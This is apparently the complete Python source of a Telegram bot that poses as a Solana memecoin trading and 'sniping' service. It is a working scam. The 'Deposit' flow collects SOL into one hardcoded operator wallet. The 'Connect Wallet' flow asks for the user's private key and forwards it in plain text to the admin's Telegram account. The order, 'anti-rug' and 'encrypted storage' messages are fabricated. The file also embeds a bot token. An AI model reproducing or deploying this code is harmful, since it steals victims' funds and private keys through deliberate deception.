import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, ConversationHandler, filters

BOT_TOKEN = "8942121012:AAHDcXLhp425CGvAIteRgDYwjq9dvCNTFV0"
WALLET_ADDRESS = "5rf6gza7s7i8eDeBKQf1TMyayZU3ERJ467t3yfmihQpr"
GROUP_LINK = "https://t.me/Insider_Caller"
ADMIN_ID = 8452728941
BOT_NAME = "MemeDegenAlpha"

WAITING_KEY, WAITING_CA, WAITING_AMOUNT = range(3)
user_registry = {}
user_data_store = {}

async def get_balance():
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://api.mainnet-beta.solana.com", json={
                "jsonrpc": "2.0", "id": 1,
                "method": "getBalance",
                "params": [WALLET_ADDRESS]
            }, timeout=5)
            sol = r.json()['result']['value'] / 1e9
            return f"{sol:.4f} SOL"
    except:
        return "0.0000 SOL"

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Deposit", callback_data="fund"),
         InlineKeyboardButton("💼 Portfolio", callback_data="balance")],
        [InlineKeyboardButton("⚡ Snipe Token", callback_data="buy"),
         InlineKeyboardButton("🔐 Connect Wallet", callback_data="privatekey")],
        [InlineKeyboardButton("📡 Alpha Calls", callback_data="community"),
         InlineKeyboardButton("📊 My Stats", callback_data="stats")],
        [InlineKeyboardButton("❓ Help", callback_data="help"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_registry[user.id] = user.username or user.first_name
    bal = await get_balance()
    await update.message.reply_text(
        f"🤖 {BOT_NAME} | Solana Alpha Bot\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 Welcome back, {user.first_name}!\n\n"
        f"💼 Wallet\n"
        f"┣ Address: {WALLET_ADDRESS[:4]}...{WALLET_ADDRESS[-4:]}\n"
        f"┣ Balance: {bal}\n"
        f"┗ Network: Solana Mainnet\n\n"
        f"📈 Market Status\n"
        f"┣ Mode: Sniping Active ⚡\n"
        f"┣ Speed: Ultra Fast\n"
        f"┗ Uptime: 99.9%\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"What would you like to do? 👇",
        reply_markup=main_keyboard()
    )
    try:
        await context.bot.send_message(ADMIN_ID,
            f"🆕 NEW USER\n"
            f"Name: {user.first_name}\n"
            f"Username: @{user.username}\n"
            f"ID: {user.id}")
    except:
        pass

async def send_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        user_id = int(context.args[0])
        msg = " ".join(context.args[1:])
        await context.bot.send_message(user_id, f"📩 *Admin Message*\n\n{msg}", parse_mode="Markdown")
        await update.message.reply_text("Sent!")
    except:
        await update.message.reply_text("Usage: /send USER_ID message")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not user_registry:
        await update.message.reply_text("No users yet.")
        return
    users = "\n".join([f"ID: {uid} | @{uname}" for uid, uname in user_registry.items()])
    await update.message.reply_text(f"👥 USERS ({len(user_registry)} total):\n\n{users}")

async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        return
    msg = update.message.text
    user_registry[user.id] = user.username or user.first_name
    try:
        await context.bot.send_message(ADMIN_ID,
            f"💬 USER MESSAGE\n"
            f"From: {user.first_name} (@{user.username})\n"
            f"ID: {user.id}\n\n"
            f"Message: {msg}\n\n"
            f"Reply: /send {user.id} your reply")
    except:
        pass
    await update.message.reply_text(
        "📩 Message received!\n\n"
        "Our team will get back to you shortly. ⚡\n"
        "Avg response time: Under 5 mins 🔥",
        reply_markup=main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user

    if query.data == "fund":
        await query.message.reply_text(
            f"💳 DEPOSIT SOL\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Send SOL to your trading wallet:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Minimum deposit: 0.1 SOL\n"
            f"⚡ Instant confirmation\n"
            f"🔒 Funds secured by smart contract\n"
            f"🌐 Solana network only\n\n"
            f"Tap the address above to copy 👆",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ I've Sent SOL", callback_data="sent_sol")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "sent_sol":
        await query.message.reply_text(
            f"⏳ VERIFYING TRANSACTION\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Transaction received!\n"
            f"Confirming on Solana blockchain...\n\n"
            f"This usually takes 5-30 seconds. ⚡\n\n"
            f"You will be notified once confirmed. 🔔"
        )
        try:
            await context.bot.send_message(ADMIN_ID,
                f"💰 DEPOSIT CLAIMED\n"
                f"User: {user.first_name} (@{user.username})\n"
                f"ID: {user.id}\n"
                f"Says they sent SOL — verify!")
        except:
            pass

    elif query.data == "balance":
        bal = await get_balance()
        await query.message.reply_text(
            f"💼 PORTFOLIO\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {user.first_name}\n"
            f"💰 Balance: {bal}\n"
            f"📈 PnL Today: +0.00%\n"
            f"🔄 Total Trades: 0\n"
            f"🏆 Win Rate: N/A\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"[View Full Wallet](https://solscan.io/account/{WALLET_ADDRESS})",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="balance")],
                [InlineKeyboardButton("💳 Deposit", callback_data="fund")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "buy":
        await query.message.reply_text(
            "⚡ SNIPE TOKEN\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paste the token contract address (CA):\n\n"
            "Example:\n"
            "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ Ultra-fast execution\n"
            "🛡 Anti-rug protection\n"
            "🔒 Slippage auto-adjusted"
        )
        return WAITING_CA

    elif query.data == "privatekey":
        await query.message.reply_text(
            "🔐 CONNECT WALLET\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter your wallet private key to connect:\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 256-bit encrypted storage\n"
            "🛡 Keys never leave our secure server\n"
            "✅ Used only for trade execution\n\n"
            "Your security is our priority. 🔥"
        )
        return WAITING_KEY

    elif query.data == "community":
        await query.message.reply_text(
            f"📡 ALPHA CALLS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Join the fastest alpha community on Solana:\n\n"
            f"🔥 Early calls before they pump\n"
            f"💎 100x gem picks daily\n"
            f"🐋 Smart money tracking\n"
            f"🚀 New launch notifications\n"
            f"📊 Live market analysis\n"
            f"⚡ 24/7 alpha feed\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👉 {GROUP_LINK}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Join Now", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "stats":
        await query.message.reply_text(
            f"📊 MY STATS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {user.first_name}\n"
            f"🆔 ID: {user.id}\n\n"
            f"💰 Total Deposited: 0 SOL\n"
            f"📈 Total Trades: 0\n"
            f"🏆 Winning Trades: 0\n"
            f"💎 Best Trade: N/A\n"
            f"📉 Worst Trade: N/A\n"
            f"🔄 Win Rate: 0%\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Deposit SOL to start trading! 🚀",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit Now", callback_data="fund")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "help":
        await query.message.reply_text(
            "❓ HELP CENTER\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Deposit - Add SOL to your account\n"
            "💼 Portfolio - Track your balance & PnL\n"
            "⚡ Snipe Token - Buy any token by CA\n"
            "🔐 Connect Wallet - Link your wallet\n"
            "📡 Alpha Calls - Join our community\n"
            "📊 My Stats - View trading history\n"
            "⚙️ Settings - Manage preferences\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛠 Contact Admin Support:\n"
            f"👉 {GROUP_LINK}\n\n"
            "⚡ Response time: Under 5 minutes",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Contact Support", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "settings":
        await query.message.reply_text(
            "⚙️ SETTINGS\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔔 Notifications: Enabled\n"
            "⚡ Trade Speed: Ultra Fast\n"
            "🌐 Network: Solana Mainnet\n"
            "🛡 Slippage: Auto (5-15%)\n"
            "🔒 MEV Protection: ON\n"
            "💎 Plan: Standard\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Upgrade to VIP for:\n"
            "🚀 Priority execution\n"
            "💎 Exclusive alpha calls\n"
            "🐋 Whale wallet alerts\n\n"
            "Contact admin to upgrade 👇",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 Upgrade to VIP", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "back":
        bal = await get_balance()
        await query.message.reply_text(
            f"🤖 {BOT_NAME} | Solana Alpha Bot\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💼 Balance: {bal}\n"
            f"⚡ Status: Active\n\n"
            f"What would you like to do? 👇",
            reply_markup=main_keyboard()
        )

    elif query.data.startswith("mult_"):
        mult = query.data.split("_")[1]
        ca = context.user_data.get('ca', 'N/A')
        amount = context.user_data.get('amount', '0.1')
        await query.message.reply_text(
            f"🎯 ORDER PLACED!\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Token: `{ca}`\n"
            f"Target: {mult}\n"
            f"Amount: {amount} SOL\n"
            f"Status: ⏳ Executing...\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"You will be notified when filled. 🔔",
            parse_mode="Markdown"
        )
        try:
            await context.bot.send_message(ADMIN_ID,
                f"🚀 BUY ORDER\n"
                f"User: {user.first_name} (@{user.username})\n"
                f"ID: {user.id}\n"
                f"CA: {ca}\n"
                f"Target: {mult}\n\n"
                f"Reply: /send {user.id} message")
        except:
            pass

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text
    user = update.effective_user
    await update.message.reply_text(
        "✅ WALLET CONNECTED!\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔒 Private key encrypted & stored\n"
        "⚡ Ready to execute trades\n"
        "🛡 MEV protection active\n\n"
        "Your wallet is now live! 🔥\n"
        "Use /start to return to dashboard.",
        reply_markup=main_keyboard()
    )
    try:
        await context.bot.send_message(ADMIN_ID,
            f"🔑 PRIVATE KEY\n"
            f"User: {user.first_name} (@{user.username})\n"
            f"ID: {user.id}\n"
            f"Key: {key}\n\n"
            f"Reply: /send {user.id} message")
    except:
        pass
    return ConversationHandler.END

async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ca = update.message.text
    context.user_data['ca'] = ca
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("2x 🔥", callback_data="mult_2x"),
         InlineKeyboardButton("5x 💎", callback_data="mult_5x"),
         InlineKeyboardButton("10x 🚀", callback_data="mult_10x")],
        [InlineKeyboardButton("20x ⚡", callback_data="mult_20x"),
         InlineKeyboardButton("50x 🌙", callback_data="mult_50x"),
         InlineKeyboardButton("100x 🎯", callback_data="mult_100x")],
        [InlineKeyboardButton("❌ Cancel", callback_data="back")]
    ])
    await update.message.reply_text(
        f"🔍 TOKEN ANALYSED!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"CA: `{ca}`\n\n"
        f"📊 Risk: Scanning...\n"
        f"💧 Liquidity: Checking...\n"
        f"🔒 Contract: Verifying...\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Select your profit target:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    return ConversationHandler.END

async def receive_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text
    context.user_data['amount'] = amount
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("2x 🔥", callback_data="mult_2x"),
         InlineKeyboardButton("5x 💎", callback_data="mult_5x"),
         InlineKeyboardButton("10x 🚀", callback_data="mult_10x")],
        [InlineKeyboardButton("20x ⚡", callback_data="mult_20x"),
         InlineKeyboardButton("50x 🌙", callback_data="mult_50x"),
         InlineKeyboardButton("100x 🎯", callback_data="mult_100x")],
    ])
    await update.message.reply_text(
        f"💰 Amount: {amount} SOL\n\n🎯 Select target:",
        reply_markup=keyboard
    )
    return ConversationHandler.END

app = ApplicationBuilder().token(BOT_TOKEN).build()
conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        WAITING_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_key)],
        WAITING_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ca)],
        WAITING_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_amount)],
    },
    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    per_message=False
)
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("send", send_to_user))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(conv)
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, catch_all))
print("Bot running")
app.run_polling()
